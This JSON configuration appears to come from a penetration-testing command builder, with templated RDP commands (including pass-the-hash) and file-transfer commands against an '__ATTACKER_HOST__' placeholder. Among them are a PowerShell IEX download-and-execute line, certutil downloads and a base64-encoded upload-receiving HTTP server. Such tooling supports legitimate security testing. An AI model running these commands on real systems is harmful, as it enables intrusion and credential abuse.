[
  {
    "id": "rdp",
    "keywords": ["rdp", "xfreerdp", "3389"],
    "cmds": [
      {
        "win": 0,
        "label": "XfreeRDP",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "cmd": "xfreerdp /timeout:60000 /cert-ignore /compression /clipboard /dynamic-resolution /w:1280 /h:700 /port:__RDP_TARGET_PORT__ /v:__TARGET_HOST__ __DOMAIN_AUTH__ /u:'__USERNAME__' __PASSWORD_AUTH__ __SMB_SHARE_CWD__ __XFREERDP_ADMIN__ __XFREERDP_PROXY__",
        "config": [
          {
            "help": "Enable an SMB share to be served from the current working directory (eg, from kali). This share will be available to the RDP target host.",
            "replace": "__SMB_SHARE_CWD__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable SMB Share in RDP session",
              "replaceValue": "/drive:share,."
            }
          },
          {
            "help": "Enter the username",
            "replace": "__USERNAME__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Auth: Username"
            }
          },
          {
            "help": "Enable the DOMAIN flag to specify which DOMAIN for authentication",
            "replace": "__DOMAIN_AUTH__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable DOMAIN auth",
              "replaceValue": "/d:'__DOMAIN__'"
            }
          },
          {
            "help": "Enter the auth DOMAIN",
            "replace": "__DOMAIN__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Auth: DOMAIN"
            }
          },
          {
            "help": "Enable password authentication",
            "replace": "__PASSWORD_AUTH__",
            "defaultValue": 1,
            "props": {
              "type": "checkbox",
              "label": "Enable password authentication",
              "replaceValue": "/p:'__PASSWORD__'"
            }
          },
          {
            "help": "Password as plaintext",
            "replace": "__PASSWORD__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Auth: Password"
            }
          },
          {
            "help": "Enable pass the hash authentication",
            "replace": "__PASSWORD_AUTH__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable pass the hash authentication",
              "replaceValue": "/pth:'__PASSWORD_HASH__'"
            }
          },
          {
            "help": "Password Hash as plaintext",
            "replace": "__PASSWORD_HASH__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Auth: Password Hash (pth)"
            }
          },
          {
            "help": "Set the RDP Port to connect on, default 3389",
            "replace": "__RDP_TARGET_PORT__",
            "defaultValue": 3389,
            "props": {
              "type": "number",
              "label": "RDP Port",
              "InputProps": { "inputProps": { "min": 1, "max": 65535 } }
            }
          },
          {
            "help": "Enable the 'admin' session",
            "replace": "__XFREERDP_ADMIN__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable /admin (or console) session",
              "replaceValue": "/admin"
            }
          },

          {
            "help": "Enable use of a proxy for the RDP connection to connect via (/proxy:[<proto>://][<user>:<password>@]<host>:<port>)",
            "replace": "__XFREERDP_PROXY__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable proxy",
              "replaceValue": "/proxy:'__XFREERDP_PROXY_PROTO__://__XFREERDP_PROXY_AUTH____XFREERDP_PROXY_HOST__:__XFREERDP_PROXY_PORT__'"
            }
          },

          {
            "help": "Select the proxy protocol to utilize, xfreerdp default is http",
            "replace": "__XFREERDP_PROXY_PROTO__",
            "defaultValue": "http",
            "props": {
              "type": "select",
              "label": "Proxy Protocol",
              "customInput": false,
              "options": ["http", "socks5"]
            }
          },
          {
            "help": "Proxy BASIC authentication. Format is 'USERNAME:PASSWORD@' (separate username and password with colon ending with an @). Default is blank",
            "replace": "__XFREERDP_PROXY_AUTH__",
            "defaultValue": "USERNAME:PASSWORD@",
            "validationRegex": "^[^:@]+:[^@]+@$",
            "validationHelp": "Format: USERNAME:PASSWORD@",
            "props": {
              "type": "string",
              "label": "Proxy Auth"
            }
          },
          {
            "help": "Proxy hostname or ipv4. default localhost",
            "replace": "__XFREERDP_PROXY_HOST__",
            "defaultValue": "localhost",
            "props": {
              "type": "string",
              "label": "Proxy Hostname or IPv4"
            }
          },
          {
            "help": "Proxy port. Default 1080",
            "replace": "__XFREERDP_PROXY_PORT__",
            "defaultValue": 1080,
            "props": {
              "type": "number",
              "label": "Proxy Port",
              "InputProps": { "inputProps": { "min": 1, "max": 65535 } }
            }
          }
        ]
      }
    ]
  },
  {
    "id": "http-download",
    "keywords": [
      "download",
      "http",
      "curl",
      "iwr",
      "get",
      "80",
      "8080",
      "certutil"
    ],
    "cmds": [
      {
        "win": 0,
        "label": "Powershell iwr",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "cmd": "iwr http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ -outfile __FILE__"
      },
      {
        "win": 0,
        "label": "Powershell iex",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "cmd": "IEX(New-Object System.Net.WebClient).DownloadString('http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__')"
      },
      {
        "win": 0,
        "label": "curl Linux",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "cmd": "curl __EXTRA_CURL_LINUX_FLAGS__ -m __TIMEOUT_SEC__ -L http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ -o __FILE__",
        "config": [
          {
            "help": "Set the curl timeout in seconds before the command will stop and return back to the terminal, irrespective if the download was finished or not. Default is around 120 seconds.",
            "replace": "__TIMEOUT_SEC__",
            "defaultValue": 10,
            "props": {
              "type": "number",
              "label": "Timeout Seconds",
              "InputProps": { "inputProps": { "min": 0, "max": 300 } }
            }
          },
          {
            "help": "Enter any extra flags for this CURL command, default blank (none)",
            "replace": "__EXTRA_CURL_LINUX_FLAGS__",
            "defaultValue": "",
            "props": { "type": "string", "label": "Extra Curl Flags" }
          }
        ]
      },
      {
        "win": 0,
        "label": "CertUtil.exe Windows",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "cmd": "certutil.exe -urlcache -split -f __ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ __FILE__",
        "code": []
      },
      {
        "win": 0,
        "label": "curl Windows",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "cmd": "curl -OL http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__",
        "code": []
      },
      {
        "win": 1,
        "label": "python custom http server",
        "platform": "linux|windows",
        "terminal": ["sh", "bash", "ps", "cmd"],
        "cmd": "python custom_server.py __CUSTOM_HTTP_SERVER_PORT__",
        "allowTerminalWrap": true,
        "code": [
          {
            "filename": "custom_server.py",
            "data": "aW1wb3J0IGh0dHAuc2VydmVyCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBwYXJzZV9xcywgdXJscGFyc2UKaW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBvcy5wYXRoCiMgaW1wb3J0IGpzb24KCmRlZiBtYWluKFBPUlQpOgogICAgY2xhc3MgQ3VzdG9tSFRUUFJlcXVlc3RIYW5kbGVyKGh0dHAuc2VydmVyLlNpbXBsZUhUVFBSZXF1ZXN0SGFuZGxlcik6CiAgICAgICAgCiAgICAgICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICAgICAgIyBEZWJ1ZyB0aGUgR0VUIHJlcXVlc3QgcGFyYW1ldGVycwogICAgICAgICAgICBwYXJzZWRfdXJsID0gdXJscGFyc2Uoc2VsZi5wYXRoKQogICAgICAgICAgICBwYXJhbWV0ZXJzID0gcGFyc2VfcXMocGFyc2VkX3VybC5xdWVyeSkKICAgICAgICAgICAgcHJpbnQoIj09PUdFVD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpCiAgICAgICAgICAgIHByaW50KGYiUGF0aDoge3BhcnNlZF91cmwucGF0aH1cblBhcmFtZXRlcnM6IHtwYXJzZWRfdXJsLnF1ZXJ5fSIpCgogICAgICAgICAgICByZXF1ZXN0ZWRfcGF0aCA9IHNlbGYudHJhbnNsYXRlX3BhdGgoc2VsZi5wYXRoKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhyZXF1ZXN0ZWRfcGF0aCk6CiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLXUiLCAibm9ybWFsIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLXQiLCAiNjAwMCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9kb2N1bWVudC1zYXZlLnBuZyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiJHRVQge3BhcnNlZF91cmwucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIyMDAgLSBGaWxlIEZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgXSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsibm90aWZ5LXNlbmQiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdSIsICJub3JtYWwiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnLWknLCAiL3Vzci9zaGFyZS9pY29ucy9nbm9tZS80OHg0OC9hY3Rpb25zL3Byb2Nlc3Mtc3RvcC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYiR0VUIHtwYXJzZWRfdXJsLnBhdGh9IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiNDA0IC0gTk9UIEZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgXSkKCiAgICAgICAgICAgICMgSWYgdGhlIGZpbGUgZXhpc3RzIGluIHRoZSBjdXJyZW50IGRpcmVjdG9yeSwgc2VydmUgaXQsIG90aGVyd2lzZSBzZW5kIGEgNDA0LgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzdXBlcigpLmRvX0dFVCgpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KGYiZXJyb3IgZW5jb3VudGVyZWQgd2hpbGUgc2VydmluZzoge3BhcnNlZF91cmwucGF0aH0iKQogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyJub3RpZnktc2VuZCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi10IiwgIjYwMDAiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICctaScsICIvdXNyL3NoYXJlL2ljb25zL2dub21lLzQ4eDQ4L2FjdGlvbnMvcHJvY2Vzcy1zdG9wLnBuZyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiJHRVQge3BhcnNlZF91cmwucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICI1MDAgLSBJbnRlcm5hbCBFcnJvciIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0pCgogICAgICAgIGRlZiBkb19QT1NUKHNlbGYpOgogICAgICAgICAgICAjIGZvciBmaWxlIHVwbG9hZHMsIGV4cGVjdCBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0gYW5kIC91cGxvYWQgcm91dGUKICAgICAgICAgICAgaWYgc2VsZi5wYXRoLmxvd2VyKCkgPT0gJy91cGxvYWQnOgogICAgICAgICAgICAgICAgcHJpbnQoJ2ZpbGUgdXBsb2FkJykKCiAgICAgICAgICAgICAgICBjb250ZW50X2xlbmd0aCA9IGludChzZWxmLmhlYWRlcnNbJ0NvbnRlbnQtTGVuZ3RoJ10pCiAgICAgICAgICAgICAgICBib2R5ID0gc2VsZi5yZmlsZS5yZWFkKGNvbnRlbnRfbGVuZ3RoKQoKICAgICAgICAgICAgICAgICMgVE9ETzogcmFuZG9taXplIHRoaXMgZmlsZW5hbWUgaW4gdGhlIHRtcC8gZm9sZGVyCiAgICAgICAgICAgICAgICAjIFRPRE86IGVuc3VyZSB0aGUgdG1wIGZvbGRlciBleGlzdHMgd2hlbiBzdGFydGluZyB0aGlzIHNjcmlwdAogICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gJ3RtcC91cGxvYWQxLmZpbGUnCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAnd2InKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoYm9keSkKCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9pbnNlcnQtdGV4dC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIlBPU1Qge3NlbGYucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIjIwMCAtIFJlY3Yge2NvbnRlbnRfbGVuZ3RofSBieXRlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdKQoKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYidQT1NUIHJlcXVlc3QgcmVjZWl2ZWQnKQoKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAjIGZvciBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQgb3IgbXVsdGlwYXJ0L2Zvcm0tZGF0YSBhdCBhbnkgcm91dGU6CiAgICAgICAgICAgICAgICAjIERlYnVnIHRoZSBQT1NUIHJlcXVlc3QgYm9keQogICAgICAgICAgICAgICAgY29udGVudF9sZW5ndGggPSBpbnQoc2VsZi5oZWFkZXJzLmdldCgnQ29udGVudC1MZW5ndGgnKSkKICAgICAgICAgICAgICAgIHBvc3RfZGF0YSA9IHNlbGYucmZpbGUucmVhZChjb250ZW50X2xlbmd0aCkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICMgQXNzdW1pbmcgUE9TVCBkYXRhIGlzIHNlbnQgYXMgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcgb3IgJ211bHRpcGFydC9mb3JtLWRhdGEnCiAgICAgICAgICAgICAgICAjcG9zdF92YXJzID0gcGFyc2VfcXMocG9zdF9kYXRhLmRlY29kZSgndXRmLTgnKSwga2VlcF9ibGFua192YWx1ZXM9VHJ1ZSkKICAgICAgICAgICAgICAgIHByaW50KCI9PT1QT1NUPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKICAgICAgICAgICAgICAgIHByaW50KGYiUGF0aDoge3NlbGYucGF0aH1cbkJvZHk6IHtwb3N0X2RhdGF9IikKCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9pbnNlcnQtdGV4dC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIlBPU1Qge3NlbGYucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIjIwMCAtIFJlY3Yge2NvbnRlbnRfbGVuZ3RofSBieXRlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdKQoKICAgICAgICAgICAgICAgICMgUHJvdmlkZSBhIHJlc3BvbnNlIHRvIHRoZSBjbGllbnQKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYidQT1NUIHJlcXVlc3QgcmVjZWl2ZWQgYW5kIGxvZ2dlZC4nKQoKICAgIHdpdGggaHR0cC5zZXJ2ZXIuSFRUUFNlcnZlcigoJycsIFBPUlQpLCBDdXN0b21IVFRQUmVxdWVzdEhhbmRsZXIpIGFzIGh0dHBkOgogICAgICAgIHByaW50KGYiU2VydmluZyBhdCBwb3J0IHtQT1JUfSIpCiAgICAgICAgaHR0cGQuc2VydmVfZm9yZXZlcigpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249IlN0YXJ0IGFuIEhUVFAgc2VydmVyIG9uIGEgc3BlY2lmaWMgcG9ydC4iKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgncG9ydCcsIHR5cGU9aW50LCBoZWxwPSJQb3J0IHRvIHN0YXJ0IHRoZSBIVFRQIHNlcnZlciBvbiIpCiAgICBhcmdzID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQoKICAgIHRyeToKICAgICAgICBtYWluKGFyZ3MucG9ydCkKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludCgiXG5DbG9zaW5nIHNlcnZlci4uLiIpCgo="
          }
        ],
        "config": [
          {
            "help": "Set the HTTP server port",
            "replace": "__CUSTOM_HTTP_SERVER_PORT__",
            "defaultValue": 8081,
            "props": {
              "type": "number",
              "label": "Custom HTTP Port",
              "InputProps": { "inputProps": { "min": 1, "max": 65535 } }
            }
          }
        ]
      },
      {
        "win": 1,
        "label": "Python3 -m http.server",
        "platform": "linux|windows",
        "terminal": ["ps", "cmd", "sh", "bash"],
        "allowTerminalWrap": true,
        "cmd": "python__PYTHON_BIN_3__ -m http.server __ENABLE_HTTP_SERVER_BIND_TO_ADDRESS__ __CUSTOM_HTTP_SERVER_PORT__",
        "code": [],
        "config": [
          {
            "help": "Set the HTTP server port",
            "replace": "__CUSTOM_HTTP_SERVER_PORT__",
            "defaultValue": 8081,
            "props": {
              "type": "number",
              "label": "Custom HTTP Port",
              "InputProps": { "inputProps": { "min": 1, "max": 65535 } }
            }
          },
          {
            "help": "On some systems the Python binary is differentiated from Python version 2 by naming it python3. This adds the 3 to the command string for you",
            "replace": "__PYTHON_BIN_3__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Python binary is named Python3",
              "replaceValue": "3"
            }
          },
          {
            "help": "Default is to host the webserver on all interfaces. There are times when it might be useful to only host it on a given interface and/or address. This option enables the flag to this.",
            "replace": "__ENABLE_HTTP_SERVER_BIND_TO_ADDRESS__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable bind to specific ipv4 address",
              "replaceValue": "--bind __CUSTOM_HTTP_SERVER_BIND_ADDRESS__"
            }
          },
          {
            "help": "Enter the IPv4 Address to bind the python simple http server to",
            "replace": "__CUSTOM_HTTP_SERVER_BIND_ADDRESS__",
            "defaultValue": "__ATTACKER_HOST__",
            "validationRegex": "",
            "validationHelp": "",
            "props": { "type": "string", "label": "Bind IPv4 Address" }
          }
        ]
      }
    ]
  }
]
